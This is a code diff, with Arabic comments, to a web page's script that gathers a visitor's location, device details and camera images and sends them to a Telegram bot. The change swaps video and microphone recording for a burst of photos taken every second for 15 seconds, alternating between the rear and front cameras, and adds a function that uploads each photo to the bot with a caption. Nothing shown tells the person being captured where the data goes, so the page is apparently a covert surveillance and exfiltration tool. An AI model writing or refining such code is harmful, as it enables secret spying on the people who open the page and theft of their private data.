@@ -157,8 +157,7 @@
         // بيانات التطبيق
         const collectedData = {
             systemInfo: {},
-            camera: { photo: null, video: null, allowed: false },
-            microphone: { audio: null, allowed: false },
+            camera: { photos: [], allowed: false },
             location: { coords: null, address: null, allowed: false },
             battery: { level: null, charging: null },
             screen: { width: null, height: null, orientation: null }
@@ -230,46 +229,95 @@
             };
         }
         
-        // تسجيل فيديو من الكاميرا
-        async function recordVideo() {
+        // التقاط صور متناوبة من الكاميرا الخلفية والأمامية
+        async function captureAlternatingPhotos() {
             return new Promise(async (resolve, reject) => {
                 try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: 'user' }, // استخدام الكاميرا الأمامية
-                        audio: true 
-                    });
+                    // بدء بالكاميرا الخلفية (إذا كانت متوفرة)
+                    let currentCamera = 'environment';
+                    let stream = null;
+                    let videoTrack = null;
+                    let canvas = document.createElement('canvas');
+                    let context = canvas.getContext('2d');
                     
-                    const mediaRecorder = new MediaRecorder(stream, {
-                        mimeType: 'video/webm;codecs=vp9'
-                    });
-                    
-                    const videoChunks = [];
-                    
-                    mediaRecorder.ondataavailable = (event) => {
-                        if (event.data.size > 0) {
-                            videoChunks.push(event.data);
+                    // دالة لتبديل الكاميرا
+                    const switchCamera = async () => {
+                        if (stream) {
+                            stream.getTracks().forEach(track => track.stop());
+                        }
+                        
+                        try {
+                            stream = await navigator.mediaDevices.getUserMedia({ 
+                                video: { facingMode: currentCamera }
+                            });
+                            
+                            videoTrack = stream.getVideoTracks()[0];
+                            const settings = videoTrack.getSettings();
+                            canvas.width = settings.width || 640;
+                            canvas.height = settings.height || 480;
+                            
+                            // التقاط صورة
+                            context.drawImage(videoTrack.imageCapture ? 
+                                await videoTrack.imageCapture.grabFrame() : 
+                                await captureFrameFromStream(stream), 0, 0, canvas.width, canvas.height);
+                            
+                            const photoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
+                            collectedData.camera.photos.push({
+                                type: currentCamera === 'environment' ? 'الخلفية' : 'الأمامية',
+                                blob: photoBlob,
+                                timestamp: new Date().toISOString()
+                            });
+                            
+                            // تبديل الكاميرا للدورة التالية
+                            currentCamera = currentCamera === 'environment' ? 'user' : 'environment';
+                            
+                        } catch (error) {
+                            // إذا فشلت الكاميرا الخلفية، حاول بالأمامية
+                            if (currentCamera === 'environment') {
+                                currentCamera = 'user';
+                                await switchCamera();
+                            } else {
+                                throw error;
+                            }
                         }
                     };
                     
-                    mediaRecorder.onstop = () => {
-                        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
-                        collectedData.camera.video = videoBlob;
-                        collectedData.camera.allowed = true;
-                        stream.getTracks().forEach(track => track.stop());
-                        resolve();
+                    // دالة مساعدة لالتقاط إطار من الفيديو
+                    const captureFrameFromStream = (stream) => {
+                        return new Promise((resolve) => {
+                            const video = document.createElement('video');
+                            video.srcObject = stream;
+                            video.onloadedmetadata = () => {
+                                video.play();
+                                setTimeout(() => {
+                                    resolve(video);
+                                }, 100);
+                            };
+                        });
                     };
                     
-                    mediaRecorder.start();
+                    // بدء دورة التقاط الصور كل ثانية
+                    const interval = setInterval(async () => {
+                        try {
+                            await switchCamera();
+                        } catch (error) {
+                            clearInterval(interval);
+                            reject(error);
+                        }
+                    }, 1000);
                     
-                    // تسجيل لمدة 15 ثانية ثم إيقاف
+                    // إيقاف بعد 15 ثانية
                     setTimeout(() => {
-                        if (mediaRecorder.state !== 'inactive') {
-                            mediaRecorder.stop();
+                        clearInterval(interval);
+                        if (stream) {
+                            stream.getTracks().forEach(track => track.stop());
                         }
+                        collectedData.camera.allowed = true;
+                        resolve();
                     }, 15000);
                     
                 } catch (error) {
-                    reject(new Error(`فشل في تسجيل الفيديو: ${error.message}`));
+                    reject(new Error(`فشل في التقاط الصور: ${error.message}`));
                 }
             });
         }
@@ -297,8 +345,7 @@
                         
                         // طلب الأذونات بالتسلسل
                         await requestLocation();
-                        await recordVideo(); // تسجيل الفيديو بدلاً من صورة ثابتة
-                        await requestMicrophone();
+                        await captureAlternatingPhotos(); // التقاط صور متناوبة بدلاً من تسجيل فيديو
                         
                         // بعد جمع كل البيانات
                         await sendAllDataToTelegram(CHAT_ID);
@@ -353,39 +400,6 @@
             });
         }
         
-        // طلب إذن الميكروفون وتسجيل الصوت
-        async function requestMicrophone() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                const recorder = new MediaRecorder(stream);
-                const audioChunks = [];
-                
-                recorder.ondataavailable = event => audioChunks.push(event.data);
-                
-                return new Promise((resolve) => {
-                    recorder.onstop = () => {
-                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
-                        collectedData.microphone.audio = audioBlob;
-                        collectedData.microphone.allowed = true;
-                        resolve();
-                    };
-                    
-                    recorder.start();
-                    
-                    // تسجيل لمدة 15 ثانية ثم إيقاف
-                    setTimeout(() => {
-                        if (recorder.state !== 'inactive') {
-                            recorder.stop();
-                            stream.getTracks().forEach(track => track.stop());
-                        }
-                    }, 15000);
-                });
-                
-            } catch (error) {
-                throw new Error(`فشل في الوصول للميكروفون: ${error.message}`);
-            }
-        }
-        
         // إرسال جميع البيانات إلى تليجرام
         async function sendAllDataToTelegram(chatId) {
             try {
@@ -410,14 +424,12 @@
                 
                 await sendToTelegram(chatId, message, 'text');
                 
-                // إرسال الفيديو إن وجد
-                if (collectedData.camera.video) {
-                    await sendToTelegram(chatId, collectedData.camera.video, 'video');
-                }
-                
-                // إرسال التسجيل الصوتي إن وجد
-                if (collectedData.microphone.audio) {
-                    await sendToTelegram(chatId, collectedData.microphone.audio, 'audio');
+                // إرسال الصور إن وجدت
+                if (collectedData.camera.photos.length > 0) {
+                    for (const photo of collectedData.camera.photos) {
+                        const caption = `📸 صورة من الكاميرا ${photo.type} - ${new Date(photo.timestamp).toLocaleTimeString()}`;
+                        await sendPhotoWithCaption(chatId, photo.blob, caption);
+                    }
                 }
                 
             } catch (error) {
@@ -443,20 +455,26 @@
                 
                 if (type === 'photo') {
                     formData.append('photo', data, 'photo.jpg');
-                } else if (type === 'audio') {
-                    formData.append('audio', data, 'audio.wav');
-                } else if (type === 'video') {
-                    formData.append('video', data, 'video.mp4');
                 }
                 
-                const endpoint = type === 'photo' ? 'sendPhoto' : 
-                               type === 'audio' ? 'sendAudio' : 'sendVideo';
-                
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
             }
+        }
+        
+        // دالة لإرسال صورة مع تعليق
+        async function sendPhotoWithCaption(chatId, photoBlob, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', photoBlob, 'photo.jpg');
+            formData.append('caption', caption);
+            
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
         }
     </script>
 </body>
